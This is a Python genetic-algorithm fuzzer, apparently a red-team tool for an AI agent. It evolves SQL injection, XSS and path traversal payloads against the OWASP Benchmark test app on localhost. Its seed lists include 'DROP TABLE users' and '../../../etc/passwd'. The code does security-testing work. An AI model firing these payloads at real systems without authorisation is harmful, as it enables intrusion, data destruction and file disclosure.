#!/usr/bin/env python3
"""
Adversarial DevSecOps: Genetic Algorithm Fuzzer (The Red Team)
Adapted for OWASP Benchmark Java Application.
"""

import requests
import random
import json
import time
import os
from dataclasses import dataclass
from typing import List

MAX_GENERATIONS = 5
POPULATION_SIZE = 10
MUTATION_RATE = 0.3

SQLI_MUTATIONS = ["'", "\"", " OR ", " AND ", "1=1", "/*", "*/", "--", "#", "SLEEP(1)", "UNION SELECT", "admin"]
XSS_MUTATIONS = ["<script>", "</script>", "alert(1)", "onerror=", "<img src=x", "javascript:", "\">", "';"]
PATH_TRAVERSAL_MUTATIONS = ["../", "..%2f", "%2e%2e%2f", "/etc/passwd", "config.py", "..\\"]
ALL_MUTATIONS = SQLI_MUTATIONS + XSS_MUTATIONS + PATH_TRAVERSAL_MUTATIONS

@dataclass
class Chromosome:
    payload: str
    fitness: float = 0.0

class GeneticFuzzer:
    def __init__(self, target_url: str, vuln_type: str, param_name: str = "BenchmarkTest"):
        self.target_url = target_url
        self.vuln_type = vuln_type
        self.param_name = param_name
        self.session = requests.Session()
        # Suppress insecure request warnings for localhost:8443
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.verify_ssl = False

    def generate_initial_population(self, seed_payloads: List[str]) -> List[Chromosome]:
        population = []
        for seed in seed_payloads:
            population.append(Chromosome(payload=seed))
            for _ in range(max(1, POPULATION_SIZE // len(seed_payloads) - 1)):
                population.append(Chromosome(payload=self.mutate(seed)))
        return population

    def mutate(self, payload: str) -> str:
        if random.random() > MUTATION_RATE:
            return payload

        mutation_type = random.choice(["append", "prepend", "insert", "replace_char", "urlencode"])
        injection = random.choice(ALL_MUTATIONS)

        if mutation_type == "append":
            return payload + injection
        elif mutation_type == "prepend":
            return injection + payload
        elif mutation_type == "insert" and len(payload) > 1:
            idx = random.randint(1, len(payload) - 1)
            return payload[:idx] + injection + payload[idx:]
        elif mutation_type == "replace_char" and len(payload) > 0:
            idx = random.randint(0, len(payload) - 1)
            chars = list(payload)
            chars[idx] = random.choice(["'", "\"", "<", ">", "%00", "\\"])
            return "".join(chars)
        elif mutation_type == "urlencode":
            return payload.replace(" ", "%20").replace("'", "%27").replace("<", "%3C")
        
        return payload

    def crossover(self, parent1: Chromosome, parent2: Chromosome) -> Chromosome:
        p1 = parent1.payload
        p2 = parent2.payload
        if len(p1) > 1 and len(p2) > 1:
            split_p1 = random.randint(1, len(p1) - 1)
            split_p2 = random.randint(1, len(p2) - 1)
            child_payload = p1[:split_p1] + p2[split_p2:]
        else:
            child_payload = p1 + p2
        return Chromosome(payload=self.mutate(child_payload))

    def evaluate_fitness(self, chromosome: Chromosome) -> bool:
        """
        Generic fitness function targeting OWASP Benchmark parameters.
        OWASP Benchmark uses the test name (e.g. BenchmarkTest00001) as the parameter name usually.
        """
        try:
            # We send the payload in both GET and POST to cover both bases,
            # and as a header just in case.
            data = {self.param_name: chromosome.payload}
            headers = {self.param_name: chromosome.payload}
            
            response = self.session.post(
                self.target_url, 
                data=data, 
                headers=headers, 
                verify=self.verify_ssl,
                allow_redirects=True,
                timeout=5
            )
            
            resp_text = response.text.lower()
            
            # Simple heuristic checks based on vuln type
            if self.vuln_type == "xss":
                if chromosome.payload.lower() in resp_text and "<script>" in chromosome.payload.lower():
                    chromosome.fitness = 100.0
                    return True
            elif self.vuln_type == "sqli":
                if response.status_code == 500 or "syntax error" in resp_text or "sql" in resp_text:
                    chromosome.fitness = 100.0
                    return True
            elif self.vuln_type == "path-traversal":
                if response.status_code == 500 or "filenotfound" in resp_text or "root:" in resp_text:
                    chromosome.fitness = 100.0
                    return True
                    
            chromosome.fitness = max(1.0, 5.0 - (len(chromosome.payload) * 0.1))
            
        except requests.exceptions.RequestException:
            chromosome.fitness = 0.0
            
        return False

    def run_evolution(self, seed_payloads: List[str]) -> dict:
        population = self.generate_initial_population(seed_payloads)

        for generation in range(1, MAX_GENERATIONS + 1):
            successful_exploit = None
            for chromo in population:
                if self.evaluate_fitness(chromo):
                    successful_exploit = chromo
                    break
            
            if successful_exploit:
                return {
                    "vulnerable": True,
                    "target_url": self.target_url,
                    "vuln_type": self.vuln_type,
                    "successful_payload": successful_exploit.payload,
                    "generation_discovered": generation
                }

            population.sort(key=lambda x: x.fitness, reverse=True)
            next_generation = population[:2]
            
            weights = [max(c.fitness, 0.1) for c in population]
            while len(next_generation) < POPULATION_SIZE:
                parents = random.choices(population, weights=weights, k=2)
                child = self.crossover(parents[0], parents[1])
                next_generation.append(child)
                
            population = next_generation
            
        return {
            "vulnerable": False,
            "target_url": self.target_url,
            "message": "Max generations reached without bypass."
        }

def run_fuzzer(target_url: str, vuln_type: str, param_name: str) -> str:
    """Entry point for the LangGraph Agent Tool."""
    seed_map = {
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "sqli": ["' OR 1=1 --", "admin' #", "1; DROP TABLE users"],
        "path-traversal": ["../../../etc/passwd", "..\\..\\windows\\win.ini"]
    }
    
    seeds = seed_map.get(vuln_type.lower(), ["' OR 1=1 --", "<script>alert(1)</script>"])
    fuzzer = GeneticFuzzer(target_url, vuln_type.lower(), param_name)
    result = fuzzer.run_evolution(seeds)
    return json.dumps(result)

if __name__ == "__main__":
    # Test execution
    res = run_fuzzer("https://localhost:8443/benchmark/xss-00/BenchmarkTest00001", "xss", "BenchmarkTest00001")
    print(res)
